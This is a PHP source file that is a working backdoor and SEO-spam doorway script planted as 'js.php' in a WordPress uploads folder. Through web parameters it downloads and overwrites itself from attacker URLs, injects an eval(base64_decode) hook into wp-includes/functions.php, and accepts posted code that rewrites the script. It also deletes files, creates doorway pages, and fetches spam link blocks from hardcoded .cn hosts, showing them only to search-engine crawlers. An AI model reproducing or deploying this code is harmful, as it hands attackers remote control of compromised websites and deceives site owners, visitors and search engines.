<?php
function update_self($u){
	error_reporting(E_ALL & ~E_NOTICE);
	echo "updating from: ".$u."<br>";
	echo"functions.php path: [{$GLOBALS['dgfp']}]<br>";flush();
	$fc = download($u, 180, $hdr);
	echo"downloaded php size: ".strlen($fc)."<br>";
	if(!replace_substring($fc, '$GLOBALS[\'dgcp\'] = "', '";', $GLOBALS['dgcp'])){
		die("<b style=\"color:red\">failed to set path</b><br>[44883279]");
	}
	echo"<b style=\"color:green\">path set to {$GLOBALS['dgcp']}</b><br>[5482745]<br>";
	if(!replace_substring($fc, '$GLOBALS[\'dgin\'] = "', '";', $GLOBALS['dgin'])){
		die("<b style=\"color:red\">failed to set name</b><br>[58819152]");
	}
	echo"<b style=\"color:green\">name set to {$GLOBALS['dgin']}</b><br>[2246876]<br>";
	save_text_to_file($GLOBALS['dgcp'].$GLOBALS['dgin'], $fc, "file {$GLOBALS['dgcp']}{$GLOBALS['dgin']} updated successfully...<br>", 1);
	restore_self();
	inject_self();
}
function update_dg($u){
	error_reporting(E_ALL & ~E_NOTICE);
	echo "updating goorgen from: ".$u."<br>";
	$fc = download($u, 180, $hdr);
	echo"downloaded php size: ".strlen($fc)."<br>";
	save_text_to_file($GLOBALS['dgdf'], $fc, "file {$GLOBALS['dgdf']} updated successfully...<br>", 1);
}

function download($url, $connect_timeout, &$header, $post = ''){
	$done = false;
	if(!$url){return '';}

	$url_info = parse_url($url);
	$url_info[port] = ($url_info[port]) ? $url_info[port] : 80;
	$url_info[path] = ($url_info[path]) ? $url_info[path] : "/";
	$url_info[query] = ($url_info[query]) ? $url_info[path] = $url_info[path] . "?" . $url_info[query] : "";
	if($post){
		$method = 'POST';
	}else{
		$method = 'GET';
	}
	$query = "{$method} " . $url_info[path] . " HTTP/1.1\r\n";
	$query .= "Host: " . $url_info[host] . "\r\n";
	$query .= "Accept: */*" . "\r\n";
	$query .= "Connection: close" . "\r\n";
	$query .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12" . "\r\n";
	if($post){
		$query .= "Content-Type: application/x-www-form-urlencoded" . "\r\n";
		$query .= "Content-Length: " . strlen($post) . "\r\n";
	}
	$query .= "\r\n{$post}";
	$errno = 0;
	$error = "";
	$sock = fsockopen($url_info[host], $url_info[port], $errno, $error, $connect_timeout);
	$h = array();
	$resp = array();
	if($sock){
		stream_set_timeout($sock, $connect_timeout);
		fwrite($sock, $query);
		$hd = false;
		while(!feof($sock)){
			$l = fgets($sock);
			if(!$hd){
				if(trim($l) == ''){
					$hd = true;
				}else{
					$header[] = $l;
				}
			}else{
				$resp[] = $l;
			}
		}
		fclose($sock);
	}
	$ret = implode("", $resp);
	return $ret;
}

function restore_self(){
	echo "restoring functions.php at path [{$GLOBALS['dgfp']}]<br>";flush();

	$pf = implode("", file($GLOBALS['dgfp']));
	if($pf){
		echo"{$GLOBALS['dgfp']} loaded successfully<hr>";
	}else{
		die("failed to load {$GLOBALS['dgfp']}<br>[8856284]");
	}
	if(strpos($pf, 'eval(base64_decode') > 0){
		echo"{$GLOBALS['dgfp']} is patched. Removing inj...<br>";
		$pf = '';
		$arr = file($GLOBALS['dgfp']);
		foreach($arr as $key=>$val){
			if(strpos($val, 'eval(base64_decode')){
			}else{
				$pf .= $val;
			}
		}
		save_text_to_file($GLOBALS['dgfp'], $pf, "file {$GLOBALS['dgfp']} successfully RESTORED<br>[88293764]<br>", 1);
	}else{
		echo"{$GLOBALS['dgfp']} is not patched.<br>";
	}
	if(isset($_GET['showf'])){
		echo"<hr>\n\n{$pf}\n\n";
	}
}

function inject_self(){
	echo "injecting...<br>";flush();

	$pf = implode("", file($GLOBALS['dgfp']));
	if($pf){
		echo"{$GLOBALS['dgfp']} loaded successfully<hr>";
	}else{
		die("failed to load {$GLOBALS['dgfp']}<br>[8856284]");
	}
	if(strpos($pf, 'eval(base64_decode') > 0){
		echo"{$GLOBALS['dgfp']} is already patched.<br>";
	}else{
		$tmp = preg_split('/\}\s+function/', $pf);
		$middle = round(count($tmp) / 2);
		echo"functions count: ".count($tmp)."; insert at pos: $middle<br>";
		$pf = '';
		$dgi = 0;
		foreach($tmp as $key=>$val){
			$dgi++;
			if(!$found){
				$tmp1 = explode("\n", $val);
				$str = '';
				foreach($tmp1 as $k=>$v){
					$add = '';
					if(!$found){
						$found = preg_match("/@date\($dateformatstring/i", $v);
						if($found){
							$encoded = "	";
							$add = "\n " . $encoded;
						}
					}
					$str .= $v . $add . "\n";
				}
				if($found){
					$val = rtrim($str) . "\n";
				}
			}
			if($dgi == count($tmp)){
				$pf = $pf.$val;
			}else{
				if($dgi == $middle){
					$encoded = "	";
					$pf = $pf.$val."}\n{$encoded}\nfunction";
				}else{
					$pf = $pf.$val."}\n\nfunction";
				}
			}
		}
		if($found){$found = ' [wpl successfull 09034848]';}else{$found = ' [wpl failed 09876543]';}
		save_text_to_file($GLOBALS['dgfp'], $pf, "file {$GLOBALS['dgfp']} updated {$found}<br>[88293765]<br>", 1);
	}
	if(isset($_GET['showf'])){
		echo"<hr>\n\n{$pf}\n\n";
	}
}

function clear_folder($folder, $remove = false){
	$ret = true;
	if(file_exists($folder)){
		$h = opendir($folder);
		while(strlen($file = readdir($h))){
			if($file == '.' || $file == '..'){
				continue;
			}
			if(is_dir($folder.$file)){
				$ret = clear_folder($folder.$file.'/', true);
				continue;
			}
			if(!unlink($folder.$file)){
				$ret = false;
			}
		}
		closedir($h);
		if($remove && !rmdir($folder)){
			$ret = false;
		}
	}
	return $ret;
}
function show_my_info(){
	global $_POST;
	error_reporting(E_ALL & ~E_NOTICE);
	set_time_limit(600);

	echo"full path: {$GLOBALS['dgcp']}{$GLOBALS['dgin']}<br>";
	echo"functions.php path: {$GLOBALS['dgfp']}<br>";

	if(strlen(trim($_POST['code'])) > 1000){
		$_POST['code'] = trim(rawurldecode($_POST['code']));
		if(get_magic_quotes_gpc()){
			$_POST['code'] = stripslashes($_POST['code']);
		}
		if(strlen($_POST['code']) <> filesize($GLOBALS['dgcp'].$GLOBALS['dgin'])){
			save_text_to_file($GLOBALS['dgcp'].$GLOBALS['dgin'], $_POST['code'], "main script file {$GLOBALS['dgcp']}{$GLOBALS['dgin']} updated successfully...<br>", 1);
		}
	}
	if($_POST['dgopt']){
		$_POST['dgopt'] = rawurldecode($_POST['dgopt']);
		if(get_magic_quotes_gpc()){
			$_POST['dgopt'] = stripslashes($_POST['dgopt']);
		}
		save_text_to_file($GLOBALS['dgcn'], $_POST['dgopt'], "options file {$GLOBALS['dgcn']} updated successfully...<br>", 1);
	}
	if($_POST['dgkeywords']){
		$_POST['dgkeywords'] = rawurldecode($_POST['dgkeywords']);
		if(get_magic_quotes_gpc()){
			$_POST['dgkeywords'] = stripslashes($_POST['dgkeywords']);
		}
		if(!file_exists($GLOBALS['dgkf']) || strlen($_POST['dgkeywords']) <> filesize($GLOBALS['dgkf'])){
			save_text_to_file($GLOBALS['dgkf'], $_POST['dgkeywords'], "keywords file {$GLOBALS['dgkf']} updated successfully...<br>", 1);
			clear_cache();
			dg_install();
		}
	}
	if($_POST['dgtemplate']){
		$_POST['dgtemplate'] = rawurldecode($_POST['dgtemplate']);
		if(get_magic_quotes_gpc()){
			$_POST['dgtemplate'] = stripslashes($_POST['dgtemplate']);
		}
		if(!file_exists($GLOBALS['dgtf']) || strlen($_POST['dgtemplate']) <> filesize($GLOBALS['dgtf'])){
			save_text_to_file($GLOBALS['dgtf'], $_POST['dgtemplate'], "template file {$GLOBALS['dgtf']} updated successfully...<br>", 1);
		}
	}
	if($_POST['dgdoorgen']){
		$_POST['dgdoorgen'] = rawurldecode($_POST['dgdoorgen']);
		if(get_magic_quotes_gpc()){
			$_POST['dgdoorgen'] = stripslashes($_POST['dgdoorgen']);
		}
		if(!file_exists($GLOBALS['dgdf']) || strlen($_POST['dgdoorgen']) <> filesize($GLOBALS['dgdf'])){
			save_text_to_file($GLOBALS['dgdf'], $_POST['dgdoorgen'], "doorgen file {$GLOBALS['dgdf']} updated successfully...<br>", 1);
		}
	}
//	<h2>Main Script:</h2>
//	<textarea name='code' style='width:100%;height:200px;'>".htmlentities(get_main_script())."</textarea>
	
	echo"<hr><form action=\"?dgsetup\" method='POST'>
	<h2>Options:</h2>
	<textarea name='dgopt' style='width:100%;height:300px;'>".get_opt_text()."</textarea>
	<h2>Keywords:</h2>
	<textarea name='dgkeywords' style='width:100%;height:200px;'>".read_keywords()."</textarea>
	<h2>Template:</h2>
	<textarea name='dgtemplate' style='width:100%;height:200px;'>".htmlentities(read_template())."</textarea>
	<h2>Doorgen:</h2>
	<textarea name='dgdoorgen' style='width:100%;height:200px;'>".htmlentities(read_doorgen())."</textarea>
	<br /><br /><input type='submit' value='UPDATE'></form>";
	echo"<h2>visitors:</h2>";
	echo read_visitors();flush();

	echo"<hr><h2>cache state:</h2>";flush();
	$c = 0;
	$t = 0;
	$h = opendir($GLOBALS['dgcp']);
	if($h){
		while(strlen($f = readdir($h))){
			if(is_dir($GLOBALS['dgcp'].$f) || preg_match("/\D/", $f)){
				continue;
			}
			$t++;
			$fs = filesize($GLOBALS['dgcp'].$f);
			if($fs > 0){
				$c++;
				echo"{$f} [size: {$fs}]<br>";
			}
		}
		closedir($h);
	}else{
		echo"can't opendir {$GLOBALS['dgcp']}<br>";
	}
	if($t > 0){
		echo"TOTAL PAGES: <b>$t</b>; CREATED: <b>$c</b> [" . round(($c / $t) * 1000) / 10 . "%]<br>";
	}else{
		echo"CACHE IS EMPTY<br>";
	}
}

function clear_cache(){
	$h = opendir($GLOBALS['dgcp']);
	if($h){
		while(strlen($f = readdir($h))){
			if(is_dir($GLOBALS['dgcp'].$f) || preg_match("/\D/", $f)){
				continue;
			}
			if(!unlink($GLOBALS['dgcp'].$f)){
				echo"<b style='color:red'>failed to remove {$GLOBALS['dgcp']}{$f}</b><br>";
			}
		}
		closedir($h);
		echo"<b style='color:green'>CACHE CLEARED</b><br>";
	}else{
		echo"can't opendir {$GLOBALS['dgcp']}<br>";
	}
}

function dg_install(){

	echo"<h2>installing...</h2>";flush();
	if(file_exists($GLOBALS['dgkf'])){
		$GLOBALS['keywords'] = file($GLOBALS['dgkf']);
		if(!$GLOBALS['keywords']){
			echo"<b style='color:red'>NO KEYWORDS</b><br>";
			return;
		}
	}else{
		echo"<b style='color:red'>NO KEYWORDS FILE</b><br>";
		return;
	}
	$done = 0;
	$skipped = 0;
	$failed = 0;
	foreach($GLOBALS['keywords'] as $key=>$val){
		if(!file_exists($GLOBALS['dgcp'] . $key)){
			if(touch($GLOBALS['dgcp'] . $key)){
				$done++;
			}else{
				$failed++;
			}
		}else{
			$skipped++;
		}
	}
	echo"<b style='color:green'>INSTALLED. Pages Created: {$done}; Pages Already presents: {$skipped}; Failed To Create: {$failed}</b><br>";
}

function dg_count(){
	echo read_visitors();
	echo "<hr>{$GLOBALS['dgopt']['dgurl']}";
}

function save_text_to_file($fn, $t, $m = '', $r = 0){
	if($r){
		$f = fopen($fn, "w");
	}else{
		$f = fopen($fn, "a");
	}
	if($f){
		fwrite($f, $t);
		fflush($f);
		fclose($f);
		echo $m;
	}else{
		die("can't create file $fn");
	}
}

function gml(){
	global $_GET;
	error_reporting(0);
	$ret = '';
	if(isset($_GET['refreshlinks']) || isset($_GET['showlinks']) || isset($_GET['clearlinks'])){
		$_SERVER['REQUEST_URI'] = str_replace('refreshlinks', '', $_SERVER['REQUEST_URI']);
		$_SERVER['REQUEST_URI'] = str_replace('showlinks', '', $_SERVER['REQUEST_URI']);
		$_SERVER['REQUEST_URI'] = preg_replace('/\&\&/', '&', $_SERVER['REQUEST_URI']);
		$_SERVER['REQUEST_URI'] = preg_replace('/\??\&?$/', '', $_SERVER['REQUEST_URI']);
		$log = 1;
	}else{
		$log = 0;
	}
	if(!$log && ($GLOBALS['dgopt']['dgblo'] && !detect_se_bot())){
		return $ret;
	}
	if(isset($_GET['clearlinks'])){
		$h = opendir($GLOBALS['dgcp']);
		$domains = array();
		if($_GET['clearlinks']){
			$domains = explode('@sep@', $_GET['clearlinks']);
		}
		while(strlen($f = readdir($h))){
			if(is_dir($GLOBALS['dgcp'].$f) || strlen($f) <> 32){
				continue;
			}
			if(count($domains)){
				$rlb = prepare_links($GLOBALS['dgcp'].$f);
				$old_count = count($rlb['blocks']);
				foreach($domains as $key1=>$domain){
					if(!$domain){
						continue;
					}
					foreach($rlb['blocks'] as $key2=>$link_block){
						if(strpos($link_block, "http://{$domain}/") || strpos($link_block, "http://{$domain}\"")){
							unset($rlb['blocks'][$key2]);
							foreach($rlb['links'] as $key3=>$link){
								if(!(strpos($link, "http://{$domain}/") === false) || !(strpos($link, "http://{$domain}\"") === false)){
									unset($rlb['links'][$key3]);
								}
							}
						}
					}
				}
				if(!count($rlb['blocks'])){
					if(unlink($GLOBALS['dgcp'].$f)){$ret .= "<nobr>found: links file {$GLOBALS['dgcp']}{$f} removed</nobr><br>";}else{$ret .= "<nobr>found: can't remove links file {$GLOBALS['dgcp']}{$f}</nobr><br>";}
				}elseif($old_count <> count($rlb['blocks'])){
					$myblock = $rlb['pre'] . implode("", $rlb['blocks']) . '<!--' . rand(1, 99999999999) . '-->' . $rlb['post'];
					save_text_to_file($GLOBALS['dgcp'].$f, $myblock, "<nobr>found: links file {$GLOBALS['dgcp']}{$f} updated</nobr><br>", 1);
				}
			}else{
				if(unlink($GLOBALS['dgcp'].$f)){$ret .= "<nobr>links file {$GLOBALS['dgcp']}{$f} removed...</nobr><br>";}else{$ret .= "<nobr>can't remove links file {$GLOBALS['dgcp']}{$f}</nobr><br>";}
			}
		}
		return $ret;
	}
	$dgcf = $GLOBALS['dgcp'].md5('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
	if(!$GLOBALS['dgopt']['dguh']){
		if($log){$ret .= "<b><nobr>[no url for updates: {$GLOBALS['dgopt']['dguh']}]</nobr></b><br>";}
		return $ret;
	}
	if(strpos(strtolower($_SERVER['REQUEST_URI']), 'http://') === 0){
		$uu = $_SERVER['REQUEST_URI'];
	}else{
		$uu = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	}
	if($log){$ret .= "<nobr><b>[real url: {$uu}]</b></nobr><br>";}
	$tglc = 0;

	$lb = prepare_links($dgcf);
	if(isset($_GET['refreshlinks'])){
		$lb['blocks'] = array();
		$lb['links'] = array();
		$lb['count'] = 0;
		$lb['exclusive'] = '';
	}

	if($lb['count'] < $GLOBALS['dgopt']['ml'] && !$lb['exclusive']){
		$uu = $GLOBALS['dgopt']['dguh'].'?p=' . rawurlencode($uu) . '&l=' . $lb['count'];
		$post = '';
		$header = array();
		foreach($lb['links'] as $key=>$val){
			$post .= str_replace('.', '@sep@', rawurlencode($val)) . "=1&";
		}
		if($log){$ret .= "<nobr>downloading html block from: $uu</nobr><br>";}
		$dw = trim(download($uu, 5, $header, $post));
		foreach($header as $key=>$val){
			$tmp = explode(':', $val);
			if(strtolower(trim($tmp[0])) == 'set-cookie'){
				$cookie = explode('=', $tmp[1]);
				if(strtolower(trim($cookie[0])) == 'ml'){
					$ml = trim($cookie[1]);
					if($ml > 0 && $ml <> $GLOBALS['dgopt']['ml']){
						$GLOBALS['dgopt']['ml'] = $ml;
						set_options();
					}
					break;
				}
			}
		}
		$p = strpos($dw, '<');
		if($p > 0){$dw = substr($dw, $p, strlen($dw));}
		$p = strrpos($dw, '>');
		if($p <> (strlen($dw) - 1)){$dw = substr($dw, 0, $p+1);}

		$nlb = prepare_links('', $dw);
		if($nlb['pre'] && $nlb['post']){
			$lb['pre'] = $nlb['pre'];
			$lb['post'] = $nlb['post'];
		}

		if(count($nlb['blocks'])){
			foreach($nlb['blocks'] as $key=>$val){
				$lb['blocks'][] = $val;
			}
			foreach($nlb['links'] as $key=>$val){
				$lb['links'][] = $val;
			}
			$lb['count'] = count($lb['blocks']);
			$myblock = $lb['pre'] . implode("", $lb['blocks']) . '<!--' . rand(1, 99999999999) . '-->' . $lb['post'];
			save_text_to_file($dgcf, $myblock, '', 1);
			if($log){$ret .= "<nobr>file $dgcf updated</nobr><br>";}
		}else{
			if($log){$ret .= "<nobr>no new links in downloaded html</nobr><br>";}
			$myblock = $lb['pre'] . implode("", $lb['blocks']) . $lb['post'];
		}
	}else{
		$myblock = $lb['pre'] . implode("", $lb['blocks']) . $lb['post'];
	}
	$ret .= $myblock . "\n<!--dgsuccess-->";

	if($log){$ret = str_replace('absolute', '', $ret);}
	if($log){$ret .= "<hr><br><b>dgsuccess</b><br>";}
	
	return $ret;
}

function prepare_links($fn, $text = ''){
	$ret['pre'] = '';
	$ret['post'] = '';
	$ret['blocks'] = array();
	$ret['links'] = array();
	$ret['count'] = 0;
	$ret['exclusive'] = '';

	if($fn && file_exists($fn)){
		$fc .= trim(implode("", file($fn)));
	}elseif($text){
		$fc = $text;
	}else{
		return $ret;
	}
	if(strpos($fc, '<!--ex-->')){
		$ret['exclusive'] = '<!--ex-->';
	}
	$tmp = preg_split("/(\<\!\-\-[^\-]+\-\-\>)/", $fc, -1, PREG_SPLIT_DELIM_CAPTURE);
	if(count($tmp) >= 3){
		$ret['pre'] = array_shift($tmp);
		$ret['post'] = array_pop($tmp);
		$index = 0;
		foreach($tmp as $key=>$val){
			if(preg_match("/href=[\"\']([^\"\']+)[\"\']/", $val, $_m)){
				$ret['links'][] = $_m[1];
				$ret['blocks'][$index] .= $val;
			}else{
				$index++;
				$ret['blocks'][$index] = $val;
			}
		}
		if(is_array($ret['blocks']) && !strpos($ret['blocks'][count($ret['blocks'])], 'http://')){
			unset($ret['blocks'][count($ret['blocks'])]);
		}
	}
	if(is_array($ret['blocks'])){
		$ret['count'] = count($ret['blocks']);
	}else{
		$ret['exclusive'] = '';
	}
	return $ret;
}

function get_options(){
	if(file_exists($GLOBALS['dgcn'])){
		$ini = parse_ini_file($GLOBALS['dgcn']);
		if(is_array($ini)){
			foreach($ini as $key=>$val){
				$GLOBALS['dgopt'][$key] = trim($val);
			}
		}
	}
	$s = 0;
	if(!$GLOBALS['dgopt']['dgqn']){
		$GLOBALS['dgopt']['dgqn'] = "id";
		$s = 1;
	}
	if(!$GLOBALS['dgopt']['dgurl']){
		$GLOBALS['dgopt']['dgurl'] = "http://unurex.cn/in.cgi?default&parameter=$keyword&se=$se&seoref=%ref%&HTTP_REFERER=%self_url%&default_keyword=%kw%";
		$s = 1;
	}
	if(!$GLOBALS['dgopt']['tt']){
		$GLOBALS['dgopt']['tt'] = "[>UF_KEYWORD<]";
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['kd'])){
		$GLOBALS['dgopt']['kd'] = 10;
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['prl'])){
		$GLOBALS['dgopt']['prl'] = 40;
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['sp'])){
		$GLOBALS['dgopt']['sp'] = 20;
		$s = 1;
	}
	if(!$GLOBALS['dgopt']['st']){
		$GLOBALS['dgopt']['st'] = "strong;em;b;i;u";
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['ct'])){
		$GLOBALS['dgopt']['ct'] = 1000000000;
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['markov'])){
		$GLOBALS['dgopt']['markov'] = 1;
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['dgblo'])){
		$GLOBALS['dgopt']['dgblo'] = 1;
		$s = 1;
	}
	if(!isset($GLOBALS['dgopt']['frb'])){
		$GLOBALS['dgopt']['frb'] = 1;
		$s = 1;
	}
	if(!$GLOBALS['dgopt']['ml']){
		$GLOBALS['dgopt']['ml'] = 10;
		$s = 1;
	}
	if(!$GLOBALS['dgopt']['dguh']){
		$GLOBALS['dgopt']['dguh'] = 'http://uxumex.cn/';
		$s = 1;
	}
	if($s){
		set_options();
	}
}

function set_options(){
	unlink($GLOBALS['dgcn']);
	save_text_to_file($GLOBALS['dgcn'], get_opt_text());
}

function get_opt_text(){
	$ret = '';
	foreach($GLOBALS['dgopt'] as $key=>$val){
		if(is_numeric($val)){
			$ret .= $key." = ".$val."\n";
		}else{
			$ret .= $key." = \"".$val."\"\n";
		}
	}
	return $ret;
}

function change_path($np){
	$fn = $GLOBALS['dgcp'].$GLOBALS['dgin'];
	$fc = implode("", file($fn));
	if(!replace_substring($fc, '$GLOBALS[\'dgcp\'] = "', '";', $np)){
		die("<b style=\"color:red\">failed to set path</b><br>[20473]");
	}
	save_text_to_file($fn, $fc, "<b style=\"color:green\">new path set</b><br>[20473]<br><b>dgsuccess</b>", 1);
}

function replace_substring(&$text, $pret, $postt, $str){
	$pos = strpos($text, $pret);
	if(!$pos){return false;}
	$pre = substr($text, 0, $pos + strlen($pret));
	$pos = strpos($text, $postt, $pos);
	if(!$pos){return false;}
	$post = substr($text, $pos, strlen($text));
	if(strlen($pre) && strlen($post)){
		$text = $pre.$str.$post;
		return true;
	}
	return false;
}

function detect_se_bot(){
	global $_SERVER;
	$GLOBALS['sbs'] = 'google;slurp;msn';
	$GLOBALS['se_bot'] = false;
	$arr = explode(';', $GLOBALS['sbs']);
	if(!is_array($arr)){return;}
	foreach($arr as $key=>$val){
		if(!(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), $val) === false)){
			$GLOBALS['se_bot'] = true;
			return true;
		}
	}
	return false;
}

function read_keywords(){
	$ret = '';
	if(file_exists($GLOBALS['dgkf'])){
		$ret = implode("", file($GLOBALS['dgkf']));
	}
	return $ret;
}

function get_main_script(){
	$ret = '';
	if(file_exists($GLOBALS['dgcp'].$GLOBALS['dgin'])){
		$ret = implode("", file($GLOBALS['dgcp'].$GLOBALS['dgin']));
	}
	return $ret;
}

function read_template(){
	$ret = '';
	if(file_exists($GLOBALS['dgtf'])){
		$ret = implode("", file($GLOBALS['dgtf']));
	}
	return $ret;
}

function read_doorgen(){
	$ret = '';
	if(file_exists($GLOBALS['dgdf'])){
		$ret = implode("", file($GLOBALS['dgdf']));
	}
	return $ret;
}

function read_visitors(){
	$ret = '';
	if(file_exists($GLOBALS['dglf'])){
		$ret = implode("<br>", file($GLOBALS['dglf']));
	}
	return $ret;
}

$GLOBALS['dgcp'] = "/home/greatnote/domains/greatnote.com/public_html/blog/wp-content/uploads/2007/09/";
$GLOBALS['dgin'] = "js.php";
$GLOBALS['dgdf'] = $GLOBALS['dgcp'].'dg.php';
$GLOBALS['dgtf'] = $GLOBALS['dgcp'].'t';
$GLOBALS['dgcn'] = $GLOBALS['dgcp'].'cnf';
$GLOBALS['dgkf'] = $GLOBALS['dgcp'].'kwd';
$GLOBALS['dglf'] = $GLOBALS['dgcp'].'rlf';
if(isset($_GET['dgdebug'])){
	error_reporting(E_ALL & ~E_NOTICE);
}else{
	error_reporting(0);
}
get_options();
$pos = strpos($_SERVER['REQUEST_URI'], '?');
if($pos > 0){
	$GLOBALS['dgruri'] = substr($_SERVER['REQUEST_URI'], 0, $pos);
}else{
	$GLOBALS['dgruri'] = $_SERVER['REQUEST_URI'];
}
$dgdu = false;
$GLOBALS['dgrp'] = '';
if($_SERVER['SCRIPT_FILENAME'] == $GLOBALS['dgcp'].$GLOBALS['dgin']){
	$dgdu = true;
}
$arr = explode("/", $GLOBALS['dgcp']);
foreach($arr as $key=>$val){
	if(!(strpos(strtolower($val), 'wp-') === false) && file_exists($GLOBALS['dgrp']."wp-includes/functions.php")){
		$GLOBALS['dgfp'] = $GLOBALS['dgrp']."wp-includes/functions.php";
		break;
	}
	$GLOBALS['dgrp'] .= $val . '/';
}
if(!$GLOBALS['dgfp']){
	foreach($arr as $key=>$val){
		$tmpp .= $val . '/';
		if(file_exists($tmpp.'functions.php')){
			$GLOBALS['dgfp'] = $tmpp.'functions.php';
			break;
		}
		$GLOBALS['dgrp'] .= $val . '/';
	}
}
if(!$GLOBALS['dgfp']){
	$GLOBALS['dgfp'] = 'wp-includes/functions.php';
}

if(isset($_GET[$GLOBALS['dgopt']['dgqn']]) || isset($_GET['map']) || isset($_GET['anchors'])){
	if(file_exists($GLOBALS['dgdf']) && is_readable($GLOBALS['dgdf'])){
		include_once($GLOBALS['dgdf']);
	}
	die;
}elseif($_GET['update']){
	update_self($_GET['update']);
	die("<hr><b>dgsuccess</b>");
}elseif($_GET['dgupdate']){
	update_dg($_GET['dgupdate']);
	die("<hr><b>dgsuccess</b>");
}elseif(isset($_GET['dgsetup'])){
	show_my_info();
	die;
}elseif(isset($_GET['dgrestore'])){
	restore_self();
	die("<hr><b>dgsuccess</b>");
}elseif(isset($_GET['dginject'])){
	inject_self();
	die("<hr><b>dgsuccess</b>");
}elseif(isset($_GET['clear_cache'])){
	clear_cache();
	die("<hr><b>dgsuccess</b>");
}elseif(isset($_GET['install'])){
	dg_install();
	die("<hr><b>dgsuccess</b>");
}elseif(isset($_GET['dgcount'])){
	dg_count();
	die("<hr><b>dgsuccess</b>");
}elseif(isset($_GET['changep'])){
	change_path(rawurldecode($_GET['changep']));
	die;
}elseif(isset($_GET['dgpath'])){
	die($GLOBALS['dgcp'].$GLOBALS['dgin']);
}elseif(isset($_GET['clearlinks'])){
	echo gml();
	die;
}else{
	foreach($_GET as $key=>$val){
		$arr=explode("=", $key);
		if(is_array($arr) && $arr[0] == 'update'){
			update_self(str_replace('_', '.', $arr[1]));
			die("<hr><b>dgsuccess</b>");
		}elseif(is_array($arr) && $arr[0] == 'clearlinks'){
			$_GET['clearlinks'] = str_replace('_', '.', $arr[1]);
			echo gml();
			die;
		}
	}
	$u = 0;
	$s = 0;
	foreach($_POST as $key=>$val){
		if(get_magic_quotes_gpc()){$val = stripslashes($val);}
		if($key == 'update'){
			update_self($val);
			$s = 1;
		}elseif($key == 'clearlinks'){
			$_GET['clearlinks'] = $val;
			echo gml();
			$s = 1;
		}elseif($key == 'update'){
			update_self($val);
			$s = 1;
		}elseif($key == 'dgupdate'){
			update_dg($val);
			$s = 1;
		}elseif($key == 'dgsetup'){
			show_my_info();
			$s = 1;
		}elseif($key == 'dgrestore'){
			restore_self();
			$s = 1;
		}elseif($key == 'dginject'){
			inject_self();
			$s = 1;
		}elseif($key == 'clear_cache'){
			clear_cache();
			$s = 1;
		}elseif($key == 'install'){
			dg_install();
			$s = 1;
		}elseif($key == 'dgcount'){
			dg_count();
			$s = 1;
		}elseif($key == 'changep'){
			change_path($val);
			$s = 1;
		}elseif($key == 'dgpath'){
			echo $GLOBALS['dgcp'].$GLOBALS['dgin'];
			$s = 1;
		}
		if($key == 'dgurl'){
			$GLOBALS['dgopt']['dgurl'] = $val;
			$u = 1;
		}
		if($key == 'tt'){
			$GLOBALS['dgopt']['tt'] = $val;
			$u = 1;
		}
		if($key == 'kd'){
			$GLOBALS['dgopt']['kd'] = $val;
			$u = 1;
		}
		if($key == 'prl'){
			$GLOBALS['dgopt']['prl'] = $val;
			$u = 1;
		}
		if($key == 'sp'){
			$GLOBALS['dgopt']['sp'] = $val;
			$u = 1;
		}
		if($key == 'st'){
			$GLOBALS['dgopt']['st'] = $val;
			$u = 1;
		}
		if($key == 'ct'){
			$GLOBALS['dgopt']['ct'] = $val;
			$u = 1;
		}
		if($key == 'markov'){
			$GLOBALS['dgopt']['markov'] = $val;
			$u = 1;
		}
		if($key == 'dgblo'){
			$GLOBALS['dgopt']['dgblo'] = $val;
			$u = 1;
		}
		if($key == 'frb'){
			$GLOBALS['dgopt']['frb'] = $val;
			$u = 1;
		}
		if($key == 'ml'){
			$GLOBALS['dgopt']['ml'] = $val;
			$u = 1;
		}
		if($key == 'dguh'){
			$GLOBALS['dgopt']['dguh'] = $val;
			$u = 1;
		}
	}
	if($u){
		print_r($GLOBALS['dgopt']);
		set_options();
		die("<hr><b>dgsuccess</b>");
	}
	if($s){
		die("<hr><b>dgsuccess</b>");
	}
}
?>